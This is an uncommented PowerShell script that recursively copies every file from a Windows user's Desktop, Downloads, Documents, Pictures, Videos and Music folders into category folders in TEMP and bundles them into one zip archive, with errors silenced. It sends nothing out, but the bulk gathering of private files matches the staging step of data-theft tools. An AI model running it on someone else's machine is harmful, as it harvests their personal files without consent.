$D = "$env:TEMP\DataT"
$Z = "$env:TEMP\DataT.zip"

Remove-Item $D,$Z -Recurse -Force -ErrorAction SilentlyContinue
New-Item $D -ItemType Directory -Force | Out-Null

$Categories = @{
    Pictures = @(".jpg",".jpeg",".png",".gif",".webp",".bmp",".svg")
    Videos   = @(".mp4",".mkv",".mov",".avi",".wmv",".webm")
    Audio    = @(".mp3",".wav",".flac",".m4a",".ogg")
    Documents = @(".doc",".docx",".xls",".xlsx",".ppt",".pptx")
    Text     = @(".txt",".csv",".json",".xml",".log",".md")
    PDF      = @(".pdf")
    Programs = @(".exe",".msi",".bat",".cmd",".ps1",".py",".js")
    Archives = @(".zip",".rar",".7z",".tar",".gz")
}

$Categories.Keys | ForEach-Object {
    New-Item "$D\$_" -ItemType Directory -Force | Out-Null
}
New-Item "$D\Other" -ItemType Directory -Force | Out-Null

$Folders = @("Desktop","Downloads","Documents","Pictures","Videos","Music")

foreach ($Folder in $Folders) {
    $Source = "$env:USERPROFILE\$Folder"

    if (Test-Path $Source) {
        Get-ChildItem $Source -File -Recurse -ErrorAction SilentlyContinue | ForEach-Object {

            $Extension = $_.Extension.ToLower()
            $Category = "Other"

            foreach ($Name in $Categories.Keys) {
                if ($Categories[$Name] -contains $Extension) {
                    $Category = $Name
                    break
                }
            }

            $Destination = "$D\$Category\$($_.Name)"

            if (Test-Path $Destination) {
                $Base = [IO.Path]::GetFileNameWithoutExtension($_.Name)
                $Ext  = [IO.Path]::GetExtension($_.Name)
                $Number = 1

                do {
                    $Destination = "$D\$Category\${Base}_$Number$Ext"
                    $Number++
                } while (Test-Path $Destination)
            }

            Copy-Item $_.FullName $Destination -Force -ErrorAction SilentlyContinue
        }
    }
}

Compress-Archive -Path "$D\*" -DestinationPath $Z -Force

Remove-Item $D -Recurse -Force -ErrorAction SilentlyContinue

Write-Host "Created: $Z"
